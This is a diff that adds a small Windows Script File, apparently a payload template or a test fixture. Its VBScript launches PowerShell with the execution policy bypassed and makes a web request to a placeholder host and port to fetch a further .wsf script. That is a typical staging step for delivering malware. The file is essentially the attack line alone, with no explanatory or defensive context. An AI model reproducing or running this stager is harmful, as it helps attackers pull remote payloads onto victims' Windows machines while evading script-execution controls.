@@ -1,0 +1,6 @@
+<job id="IncludeExample">
+<script language="VBScript">
+Set objApp = CreateObject("WScript.Shell")
+objApp.run "powershell -nop -exec bypass iwr http://LOCAL_IP:LOCAL_PORT/HTTP_28_powershell.wsf"
+</script>
+</job>
